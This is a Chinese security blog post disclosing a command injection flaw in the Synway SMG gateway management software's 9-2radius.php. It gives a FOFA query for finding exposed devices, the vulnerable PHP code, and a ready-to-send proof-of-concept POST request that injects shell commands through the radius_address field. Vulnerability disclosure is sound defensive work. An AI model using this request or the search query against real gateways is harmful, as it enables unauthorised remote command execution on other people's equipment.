---
title: "Synway SMG网关管理软件 9-2radius.php 命令注入漏洞"
source: https://mrxn.net/jswz/synway-9-2radius-rce.html
asset_dir: assets/synway-smg网关管理软件-9-2radius.php-命令注入漏洞
---

# Synway SMG网关管理软件 9-2radius.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/2 08:30
- 1315浏览
- [0评论](#comment)
- 20分钟阅读

深入探索

服务器

server

软件

---

# 漏洞简介

三汇SMG 网关管理软件是与三汇SMG系列数字网关产品配套的管理工具，是杭州三汇信息工程有限公司开发的一款高效、稳定、易用的网关管理软件。它专为三汇SMG系列数字网关设计，提供了全面的配置、监控、管理和维护功能，帮助用户轻松实现网关设备的远程管理和优化。由于 `9-2radius.php` 参数 `slave` 的处理不当，导致[命令注入](https://mrxn.net/tag/rce)问题，攻击者可以通过远程发起攻击。

# fofa语法

> `body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")`

# 漏洞分析

直接看 9-2radius.php 关键业务逻辑实现部分

```
if($_POST[save]!="")
{
  $enable_radius_new = $_POST[enable_radius]==""?0:1;
  ......
    if($enable_radius_new)
    {
      .......
        $address_info = explode(":",$_POST[radius_address]);
        $cmd = "sed -i 's/server first .*/server first $address_info[0] $_POST[shared_secret] 1812 $address_info[1]/g' $radius_file";
        system($cmd);
      ......
        if($_POST[radius_address2] == "")
        {
         ......
           else
        {
            $address_info = explode(":",$_POST[radius_address2]);
            if($flag)
            {//如果备用服务器地址被注释的话要解开注释
                $cmd = "sed -i 's/#server second .*/server second $address_info[0] $_POST[shared_secret2] 1812 $address_info[1]/g' $radius_file";
            }
            else
            {
                $cmd = "sed -i 's/server second .*/server second $address_info[0] $_POST[shared_secret2] 1812 $address_info[1]/g' $radius_file";
            }
            system($cmd);
        }
        $cmd = "sed -i 's/source_ip .*/source_ip $_POST[source_ip]/g' $radius_file";
        system($cmd);
        $cmd = "sed -i 's/timeout .*/timeout $_POST[timeout]/g' $radius_file";
        system($cmd);
        $cmd = "sed -i 's/retry .*/retry $_POST[retry]/g' $radius_file";
        system($cmd);
    }
```

深入探索

Web安全课程

网络安全培训

Web安全书籍

当满足下列条件时

- save 不为空
- enable\_radius 不为空

将 `radius_address` 和 `shared_secret` 无任何过滤直接拼接进 sed 命令中后调用 `system` 执行，造成[命令注入](https://mrxn.net/tag/rce "命令注入")漏洞。

同样当 `radius_address2` 不为空时，也是将其直接拼接进 sed 命令中后调用 `system` 执行，造成命令注入漏洞，同样 `shared_secret2` 也是[命令注入](https://mrxn.net/tag/rce "命令注入")点。

以及后面的 `source_ip` `timeout` 和 `retry` 都是同样直接拼接后[执行命令](https://mrxn.net/tag/rce "执行命令")。

# 漏洞复现

```
POST /en/9-2radius.php?authority=6 HTTP/1.1
Host: synway.mrxn.net
Content-Type: application/x-www-form-urlencoded

save=1&enable_radius=1&radius_address=/';id;+#+
```

[![Synway SMG网关管理软件 9-2radius.php 命令注入漏洞](images/img-001-9cee92533ee8.webp)](https://image.mrxn.net/441f42149ae8481b8380d27901843024.webp)

成执行 `id` 命令并回显结果

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
